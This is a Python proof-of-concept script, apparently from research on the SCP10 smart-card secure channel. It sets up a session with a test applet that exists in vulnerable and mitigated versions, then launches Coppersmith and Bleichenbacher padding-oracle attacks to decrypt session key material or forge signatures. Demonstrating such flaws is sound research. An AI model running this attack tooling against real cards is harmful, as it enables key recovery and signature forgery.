#!/usr/bin/env python3
import sys

from smartcard.sw.SWExceptions import SWException
from smartcard.util import toHexString
from Client.scp10Client import SCP10Client
from Client.crt import CRT
from BleichenbacherAttack.attack import BleichenbacherAttacker

import subprocess


def read_as_hex(filename):
    with open(filename, "rb") as f:
        content = f.read()
    out = []
    for b in content:
        out.append(b)
    return out


def read_as_tuple(filename):
    out = []
    with open(filename, "r") as f:
        for line in f:
            val = line.split('=')[1]
            out.append(int(val, 16))
    return tuple(out)


client_key = read_as_tuple("_data/client.key")
client_cert = read_as_hex("_data/client.cvc")

tp_key = read_as_tuple("_data/trust_point.key")
tp_cert = read_as_hex("_data/trust_point.cvc")

CRT_MAC = 0xB4
CRT_ENC = 0xB8

AID_vulnerable = [0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0x01, 0x01]
AID_mitigated = [0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0x02, 0x01]
mutual_auth = True
key_transport = True
card_cert_verif = True
debug = False
nb_crts = 1

vulnerable = True

try:
    AID = AID_vulnerable if vulnerable else AID_mitigated
    legitimate_client = SCP10Client(client_key, client_cert, tp_key, tp_cert, key_transport=key_transport, mutual_auth=mutual_auth, cert_verif=card_cert_verif, debug=debug, chan=1, vuln=vulnerable)
    legitimate_client.select(AID)
    legitimate_client.manage_security_env()
    legitimate_client.send_cert()
    legitimate_client.check_card_certificate()

    # From there, we need to generate CRTs if we are in key transport mode
    crts = []
    for i in range(nb_crts):
        if key_transport:
            if i == 0:
                crts.append(CRT(CRT_MAC, 0xC0, 16, 8))
            else:
                crts.append(CRT(CRT_ENC, 0xC0, 16, 0))
        else:
            if i == 0:
                crts.append(CRT(CRT_MAC, 0xC0, 0, 0))
            else:
                crts.append(CRT(CRT_ENC, 0xC0, 0, 0))
    ct = legitimate_client.send_encrypted_crt(crts=crts)

    # An attacker would take it from here to perform the oracle attack, or 
    # a Coopersmith attack
 
    challengeCard = legitimate_client.get_card_challenge()
    legitimate_client.external_authentication(challengeCard, crts)
    if mutual_auth or not key_transport:
        legitimate_client.internal_authentication(crts)
    legitimate_client.key_derivation(crts)

    print("Legitimate connection successfully initiated !")

    if card_cert_verif:
        print("\t[+] Certificate verification")
    else:
        print("\t[-] Skip certificate verification")

    if mutual_auth:
        print("\t[+] Mutual authentication")
    else:
        print("\t[-] External authentication only")

    if key_transport:
        print("\t[+] Key transport mode")
    else:
        print("\t[+] Key agreement mode")
    for i in range(len(crts)):
        print("\t[+] Session key", i, ": ", toHexString(legitimate_client.session_keys[i]))
        print("\t[+] IV ", i, ": ", toHexString(legitimate_client.session_ivs[i]))
        print("")
    
except (SWException, ValueError) as e:
    print(e)

if vulnerable:
    try:
        print("\n\t<<<< Attack begins >>>>\n")

        n = legitimate_client.card_key.key.n
        e = legitimate_client.card_key.key.e

        print("\n[DEBUG] Launching Coopersmith attack:")
        n_card = str(n)
        e_card = str(e)
        ct_arg = str(ct)
        subprocess.run(["./CoppersmithAttack/attack.sage", n_card, e_card, ct_arg])

        if len(sys.argv) > 1:
            print("[DEBUG] Launching Bleichenbacher attack for signature forgery:")
            ct = int(sys.argv[1], 16)
            forge = True
        else:
            print("[DEBUG] Launching Bleichenbacher attack for message decryption:")
            forge = False

        client = SCP10Client(client_key, client_cert, tp_key, tp_cert, key_transport=True, mutual_auth=False, cert_verif=False, debug=False, chan=1)
        attacker = BleichenbacherAttacker(client, n, e, ct, AID, forgery=forge)
        attacker.attack()
    except (SWException, ValueError) as e:
        print(e)
    finally:
        print("\n\t<<<< Attack ends >>>>\n")
